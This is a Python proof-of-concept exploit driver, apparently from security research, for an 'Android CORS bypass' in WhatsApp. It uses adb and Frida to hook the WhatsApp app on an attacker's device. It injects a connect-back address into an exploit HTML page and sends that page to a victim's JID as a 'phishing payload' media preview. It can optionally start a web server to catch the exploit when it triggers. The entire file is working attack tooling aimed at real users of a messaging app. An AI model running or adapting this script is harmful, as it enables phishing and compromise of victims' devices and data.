#!/usr/bin/env python3

__author__ = 'Chariton Karamitas <huku@census-labs.com>'


import sys
import os
import argparse
import time

import frida

import common
import logger
import adb
import frida_util
import server


class _NoWrapHelpFormatter(argparse.ArgumentDefaultsHelpFormatter):

    def __init__(self, *args, **kwargs):
        super(_NoWrapHelpFormatter, self).__init__(*args, **kwargs)

    def _split_lines(self, text, width):
        return super(_NoWrapHelpFormatter, self)._split_lines(text, 31337)


def main(argv):

    l = logger.get_logger('main')

    if sys.version_info.major != 3:
        l.error('Python 3.x required')
        return os.EX_USAGE

    parser = argparse.ArgumentParser(description='Android CORS bypass', formatter_class=_NoWrapHelpFormatter)

    parser.add_argument('image', metavar='IMAGE', type=str,
        help='JPEG image file to send as media preview')
    parser.add_argument('jid', metavar='JID', type=str,
        help='WhatsApp JID of victim')
    parser.add_argument('caption', metavar='CAPTION', type=str,
        help='caption to send in media preview')

    parser.add_argument('-s', '--serial', metavar='SERIAL', type=str,
        default=None, help='serial number of Android device to use')
    parser.add_argument('-f', '--frida-path', metavar='PATH', type=str,
        default=None, help='path to Frida server binary on the device')
    parser.add_argument('-a', '--connect-back-ip', metavar='IP', type=str,
        default='127.0.0.1', help='connect-back web-server IP address')
    parser.add_argument('-p', '--connect-back-port', metavar='PORT', type=int,
        default=80, help='connect-back web-server port')
    parser.add_argument('-r', '--start-server', action='store_true',
        default=False, help='Start web-server after sending phishing payload')

    args = parser.parse_args()

    l.info('Pushing JPEG image on the device')
    adb_abstractions = adb.ADBAbstractions(serial=args.serial)
    adb_abstractions.push(args.image, '%s/image.jpg' % common.TMPDIR)

    l.info('Pushing HTML document on the device')

    data = None
    with open('exploit/exploit.html') as fp:
        data = fp.read()
        data = data.replace('<ADDRESS>', 'http://%s:%d' % (args.connect_back_ip, args.connect_back_port))

    with open('/tmp/exploit.html', 'w') as fp:
        fp.write(data)

    adb_abstractions.push('/tmp/exploit.html', '%s/%s' % (common.TMPDIR, args.caption))

    l.info('Initializing Frida client and server')
    frida_abstractions = frida_util.Frida(serial=args.serial)

    try:
        frida_abstractions.attach('com.whatsapp')
    except frida.ProcessNotFoundError:
        l.info('Spawning WhatsApp')
        frida_abstractions.spawn('com.whatsapp')
        frida_abstractions.resume()

    script = frida_abstractions.load_script_file('frida_scripts/version.js')
    version = script.exports.version()
    l.info('WhatsApp version is %s' % version)

    if not os.path.exists('frida_scripts/whatsapp-%s' % version):
        raise RuntimeError('Unsupported WhatsApp version %s' % version)

    if os.path.exists('frida_scripts/whatsapp-%s/expire.js' % version):
        l.info('Re-spawning WhatsApp and bypassing expiration checks')
        frida_abstractions.spawn('com.whatsapp')
        frida_abstractions.load_script_file('frida_scripts/whatsapp-%s/expire.js' % version)
        frida_abstractions.resume()

    l.info('Waiting for 5 sec.')
    time.sleep(5)

    l.info('Sending phishing payload')
    script = frida_abstractions.load_script_file('frida_scripts/whatsapp-%s/phish.js' % version)
    script.exports.phish(args.jid, '%s/%s' % (common.TMPDIR, args.caption), '%s/image.jpg' % common.TMPDIR, args.caption)

    if args.start_server:
        l.info('Starting web-server and waiting for exploit to be triggered')
        server.start('', args.connect_back_port)
    else:
        l.info('Waiting for 5 sec.')
        time.sleep(5)

    l.info('Detaching from WhatsApp')
    frida_abstractions.detach()

    l.info('Done')

    logger.shutdown()

    return os.EX_OK


if __name__ == '__main__':
    sys.exit(main(sys.argv))

